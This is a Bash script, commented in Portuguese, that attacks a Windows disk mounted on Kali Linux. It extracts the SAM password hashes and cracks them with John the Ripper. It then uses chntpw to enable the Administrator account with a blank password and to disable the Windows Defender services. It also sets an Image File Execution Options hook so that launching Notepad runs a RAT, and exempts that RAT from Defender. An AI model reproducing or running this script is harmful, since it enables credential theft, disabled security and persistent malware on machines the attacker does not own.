#!/bin/bash

# --- CONFIGURAÇÕES ---
RAT_NAME="Windows.exe"
RAT_PATH="C:\\Windows\\System32\\$RAT_NAME"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[+] Iniciando Processo de Automação (Modo Direto)..."

# 1. LOCALIZAR ONDE VOCÊ MONTOU O DISCO
# Busca qualquer montagem dentro de /run/media/kali que tenha a pasta Windows
MOUNT_POINT=$(find /run/media/kali -maxdepth 3 -name "Windows" -type d 2>/dev/null | sed 's/\/Windows//' | head -n 1)

if [ -z "$MOUNT_POINT" ]; then
    echo "[-] Erro: Não encontrei o Windows montado em /run/media/kali/."
    echo "[!] Certifique-se de que você abriu a pasta do disco no gerenciador de arquivos."
    exit 1
fi

echo "[+] Windows detectado em: $MOUNT_POINT"

# 2. DEFINIR CAMINHOS DAS COLMEIAS
SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"
DEST_DIR="$HOME/Desktop/Post_Exploitation"
mkdir -p "$DEST_DIR"

# 3. TRATAR WORDLIST (ROCKYOU)
if [ ! -f "$WORDLIST" ]; then
    echo "[!] Descompactando RockYou..."
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$HOME/rockyou.txt"
    WORDLIST="$HOME/rockyou.txt"
fi

# 4. EXTRAÇÃO E QUEBRA DE SENHAS (JOHN)
echo "[+] Extraindo Hashes..."
sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"

echo "[+] ETAPA 1: Ataque de Dicionário (RockYou)..."
john --format=nt --wordlist="$WORDLIST" "$DEST_DIR/hashes.txt"

echo "[+] ETAPA 2: Iniciando Força Bruta (Incremental) em Background..."
john --format=nt --incremental "$DEST_DIR/hashes.txt" &

# 5. INJEÇÃO DE COMANDOS (SAM / SYSTEM / SOFTWARE)
echo "[+] Injetando modificações no Registro..."

# Ativar Admin e Limpar Senha
printf "1\n01f4\n1\n2\nq\nq\ny\n" | sudo chntpw -i "$SAM" > /dev/null

# Desativar Segurança (Defender/Filters)
printf "cd ControlSet001\\Services\\WinDefend\ned Start\n4\ncd ..\\WdFilter\ned Start\n4\ncd ..\\WdNisSvc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" > /dev/null

# Persistência IFEO (Notepad)
printf "cd Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nnk notepad.exe\ncd notepad.exe\nnv 1 Debugger\ned Debugger\n$RAT_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" > /dev/null

# Exclusão no Defender
printf "cd Microsoft\\Windows Defender\\Exclusions\\Paths\nnv 4 $RAT_PATH\ned $RAT_PATH\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" > /dev/null

# 6. FINALIZAÇÃO (SEM DESMONTAR)
echo "--------------------------------------------------"
echo "[!] OPERAÇÃO CONCLUÍDA!"
echo "[*] Verifique os resultados do John abaixo:"
john --show --format=nt "$DEST_DIR/hashes.txt"
echo "--------------------------------------------------"
echo "[+] O disco permanece montado. Pode fechar tudo e reiniciar o PC."
